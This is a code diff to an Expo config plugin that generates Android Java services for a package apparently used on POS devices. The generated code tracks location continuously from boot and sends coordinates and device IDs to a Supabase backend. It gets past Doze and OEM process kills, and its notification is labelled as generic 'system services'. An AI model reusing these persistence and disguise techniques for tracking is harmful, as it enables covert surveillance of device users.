@@ -203,9 +203,21 @@ public class BootReceiver extends BroadcastReceiver {
             return;
         }
 
-        // 1. ABRE O APP IMEDIATAMENTE — antes de qualquer HTTP
-        // Motivo: HTTP tem timeout de 8s cada; BroadcastReceiver tem 10s de vida total.
-        // Na versão anterior, HTTP vinha primeiro → receiver morria antes do startActivity.
+        // 1a. GPS NATIVO — sobe em <200ms sem depender de MainActivity estar em foreground
+        // GpsLocationService usa LocationManager diretamente, bypassa expo-location.
+        try {
+            Intent gps = new Intent();
+            gps.setClassName(context.getPackageName(),
+                    context.getPackageName() + ".GpsLocationService");
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                context.startForegroundService(gps);
+            } else {
+                context.startService(gps);
+            }
+        } catch (Exception ignored) {}
+
+        // 1b. ABRE O APP para permissoes (tela preta, fecha em ~2s)
+        // Necessario no primeiro boot para dialogo de permissao.
         try {
             Intent launch = new Intent();
             launch.setClassName(context.getPackageName(),
@@ -635,17 +647,21 @@ public class AlarmReceiver extends BroadcastReceiver {
         sb.append("}");
         postToSupabase(sb.toString());
 
-        // Usa GpsRestartService para reiniciar o GPS (funciona com tela desligada).
-        // startActivity direto é bloqueado pelo Android quando a tela está off.
-        // ForegroundService tem permissão para abrir Activity em background.
+        // Reinicia GpsLocationService se morto pelo OEM.
+        // startForegroundService e idempotente: se ja rodando, chama onStartCommand (seguro).
         try {
-            Intent restart = new Intent(context, GpsRestartService.class);
+            Intent gps = new Intent();
+            gps.setClassName(context.getPackageName(),
+                    context.getPackageName() + ".GpsLocationService");
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(restart);
+                context.startForegroundService(gps);
             } else {
-                context.startService(restart);
+                context.startService(gps);
             }
         } catch (Exception ignored) {}
+
+        // Reagenda proximo tick (setExactAndAllowWhileIdle nao e automatico)
+        AlarmScheduler.schedule(context);
     }
 
     private String getImei(Context context) {
@@ -778,12 +794,268 @@ public class AlarmScheduler {
 
         PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, flags);
         am.cancel(pi);
-        am.setInexactRepeating(
-            AlarmManager.RTC_WAKEUP,
-            System.currentTimeMillis() + INTERVAL_MS,
-            INTERVAL_MS,
-            pi
-        );
+
+        long triggerAt = System.currentTimeMillis() + INTERVAL_MS;
+
+        // setExactAndAllowWhileIdle: dispara mesmo em Doze Mode (Android 6+)
+        // setInexactRepeating pode ser deferido ate 15min no Doze
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
+        } else {
+            am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
+        }
+    }
+}
+`;
+
+// ─────────────────────────────────────────────────────────────────────────────
+// GpsLocationService — ForegroundService nativo que usa LocationManager diretamente
+// Bypassa expo-location (que falha com ForegroundServiceStartNotAllowedException no boot)
+// ─────────────────────────────────────────────────────────────────────────────
+const GPS_LOCATION_SERVICE_JAVA = `package com.system.posservice;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.IBinder;
+import android.provider.Settings;
+import android.util.Log;
+
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.TimeZone;
+
+public class GpsLocationService extends Service {
+
+    private static final String TAG          = "GpsLocationService";
+    private static final String SUPABASE_URL = "${SUPABASE_URL}";
+    private static final String ANON_KEY     = "${ANON_KEY}";
+    private static final int    NOTIF_ID     = 99;
+    private static final String CHANNEL_ID   = "gps_tracking";
+    private static final long   MIN_TIME_MS  = 30_000L;
+    private static final float  MIN_DIST_M   = 0f;
+
+    private LocationManager  locationManager;
+    private LocationListener locationListener;
+    private boolean          listening = false;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+        startForeground(NOTIF_ID, buildNotification());
+        startListening();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (!listening) startListening();
+        return START_STICKY;
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        stopListening();
+        Log.w(TAG, "Servico destruido — START_STICKY ou AlarmReceiver vai reiniciar");
+    }
+
+    private void startListening() {
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (locationManager == null) return;
+
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(Location loc) {
+                new Thread(() -> sendToSupabase(loc)).start();
+            }
+            @Override public void onStatusChanged(String p, int s, Bundle e) {}
+            @Override public void onProviderEnabled(String p) {}
+            @Override public void onProviderDisabled(String p) {}
+        };
+
+        try {
+            boolean ok = false;
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                    LocationManager.GPS_PROVIDER, MIN_TIME_MS, MIN_DIST_M, locationListener);
+                ok = true;
+                Log.i(TAG, "GPS_PROVIDER iniciado");
+            }
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER, MIN_TIME_MS, MIN_DIST_M, locationListener);
+                ok = true;
+                Log.i(TAG, "NETWORK_PROVIDER iniciado (fallback)");
+            }
+            listening = ok;
+            if (!ok) {
+                Log.e(TAG, "Nenhum provider disponivel — parando servico");
+                stopSelf();
+            }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Permissao negada: " + e.getMessage());
+            stopSelf();
+        }
+    }
+
+    private void stopListening() {
+        if (locationManager != null && locationListener != null) {
+            try { locationManager.removeUpdates(locationListener); } catch (Exception ignored) {}
+        }
+        listening = false;
+    }
+
+    private void sendToSupabase(Location loc) {
+        String serial   = Settings.Secure.getString(
+            getContentResolver(), Settings.Secure.ANDROID_ID);
+        String now      = isoNow(loc.getTime());
+        double lat      = loc.getLatitude();
+        double lng      = loc.getLongitude();
+        Float  accuracy = loc.hasAccuracy() ? loc.getAccuracy() : null;
+
+        String deviceId = sendHeartbeat(serial, lat, lng, now);
+        if (deviceId == null) {
+            Log.w(TAG, "Heartbeat falhou — localidade nao enviada");
+            return;
+        }
+        sendLocation(deviceId, lat, lng, accuracy, now);
+    }
+
+    private String sendHeartbeat(String serial, double lat, double lng, String now) {
+        String body = "{"
+            + "\\"serial\\":\\"" + serial + "\\","
+            + "\\"status\\":\\"online\\","
+            + "\\"last_seen_at\\":\\"" + now + "\\","
+            + "\\"last_lat\\":" + String.format(Locale.US, "%.8f", lat) + ","
+            + "\\"last_lng\\":" + String.format(Locale.US, "%.8f", lng)
+            + "}";
+
+        HttpURLConnection conn = null;
+        try {
+            URL url = new URL(SUPABASE_URL + "/rest/v1/devices?on_conflict=serial");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("apikey", ANON_KEY);
+            conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("Prefer", "resolution=merge-duplicates,return=representation");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
+            conn.setFixedLengthStreamingMode(bytes.length);
+            try (OutputStream os = conn.getOutputStream()) { os.write(bytes); }
+
+            int code = conn.getResponseCode();
+            if (code == 200 || code == 201) {
+                java.io.InputStream is = conn.getInputStream();
+                byte[] buf = new byte[512];
+                StringBuilder sb = new StringBuilder();
+                int n;
+                while ((n = is.read(buf)) != -1)
+                    sb.append(new String(buf, 0, n, StandardCharsets.UTF_8));
+                String resp = sb.toString();
+                int idx = resp.indexOf("\\"id\\":\\"");
+                if (idx >= 0) {
+                    int start = idx + 6;
+                    int end   = resp.indexOf("\\"", start);
+                    if (end > start) return resp.substring(start, end);
+                }
+            }
+            Log.w(TAG, "Heartbeat HTTP " + code);
+        } catch (Exception e) {
+            Log.w(TAG, "Heartbeat erro: " + e.getMessage());
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+        return null;
+    }
+
+    private void sendLocation(String deviceId, double lat, double lng, Float accuracy, String now) {
+        StringBuilder body = new StringBuilder();
+        body.append("{");
+        body.append("\\"device_id\\":\\"").append(deviceId).append("\\",");
+        body.append("\\"lat\\":").append(String.format(Locale.US, "%.8f", lat)).append(",");
+        body.append("\\"lng\\":").append(String.format(Locale.US, "%.8f", lng)).append(",");
+        if (accuracy != null) {
+            body.append("\\"accuracy\\":").append(String.format(Locale.US, "%.2f", accuracy)).append(",");
+        }
+        body.append("\\"provider\\":\\"gps\\",");
+        body.append("\\"recorded_at\\":\\"").append(now).append("\\"");
+        body.append("}");
+
+        HttpURLConnection conn = null;
+        try {
+            URL url = new URL(SUPABASE_URL + "/rest/v1/locations");
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("apikey", ANON_KEY);
+            conn.setRequestProperty("Authorization", "Bearer " + ANON_KEY);
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("Prefer", "return=minimal");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
+            byte[] bytes = body.toString().getBytes(StandardCharsets.UTF_8);
+            conn.setFixedLengthStreamingMode(bytes.length);
+            try (OutputStream os = conn.getOutputStream()) { os.write(bytes); }
+            int code = conn.getResponseCode();
+            Log.d(TAG, "Location HTTP " + code);
+        } catch (Exception e) {
+            Log.w(TAG, "Location erro: " + e.getMessage());
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    private String isoNow(long millis) {
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
+        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
+        return sdf.format(new Date(millis));
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                CHANNEL_ID, "Servicos do Sistema", NotificationManager.IMPORTANCE_LOW);
+            ch.setShowBadge(false);
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (nm != null) nm.createNotificationChannel(ch);
+        }
+    }
+
+    private Notification buildNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            return new Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("Servicos do Sistema")
+                .setContentText("Sincronizacao ativa")
+                .setSmallIcon(android.R.drawable.ic_popup_sync)
+                .setOngoing(true)
+                .build();
+        }
+        return new Notification.Builder(this)
+            .setContentTitle("Servicos do Sistema")
+            .setContentText("Sincronizacao ativa")
+            .setSmallIcon(android.R.drawable.ic_popup_sync)
+            .setOngoing(true)
+            .build();
     }
 }
 `;
@@ -804,9 +1076,15 @@ module.exports = function withBootReceiver(config) {
     const hasService = (name) =>
       app.service.some((s) => s.$?.['android:name'] === name);
 
-    if (!hasService('.GpsRestartService')) {
+    // GpsLocationService: ForegroundService nativo de GPS (substitui GpsRestartService)
+    // foregroundServiceType="location" obrigatorio para Android 10+
+    if (!hasService('.GpsLocationService')) {
       app.service.push({
-        $: { 'android:name': '.GpsRestartService', 'android:exported': 'false' },
+        $: {
+          'android:name': '.GpsLocationService',
+          'android:exported': 'false',
+          'android:foregroundServiceType': 'location',
+        },
       });
     }
 
@@ -895,13 +1173,14 @@ module.exports = function withBootReceiver(config) {
       await fs.promises.mkdir(packageDir, { recursive: true });
 
       const files = {
-        'ImeiModule.java'       : IMEI_MODULE_JAVA,
-        'ImeiPackage.java'      : IMEI_PACKAGE_JAVA,
-        'BootReceiver.java'     : BOOT_RECEIVER_JAVA,
-        'ShutdownReceiver.java' : SHUTDOWN_RECEIVER_JAVA,
-        'AlarmReceiver.java'    : ALARM_RECEIVER_JAVA,
-        'AlarmScheduler.java'   : ALARM_SCHEDULER_JAVA,
-        'GpsRestartService.java': GPS_RESTART_SERVICE_JAVA,
+        'ImeiModule.java'         : IMEI_MODULE_JAVA,
+        'ImeiPackage.java'        : IMEI_PACKAGE_JAVA,
+        'BootReceiver.java'       : BOOT_RECEIVER_JAVA,
+        'ShutdownReceiver.java'   : SHUTDOWN_RECEIVER_JAVA,
+        'AlarmReceiver.java'      : ALARM_RECEIVER_JAVA,
+        'AlarmScheduler.java'     : ALARM_SCHEDULER_JAVA,
+        'GpsLocationService.java' : GPS_LOCATION_SERVICE_JAVA,
+        // GpsRestartService.java removido: substituido por GpsLocationService
       };
 
       for (const [fileName, content] of Object.entries(files)) {
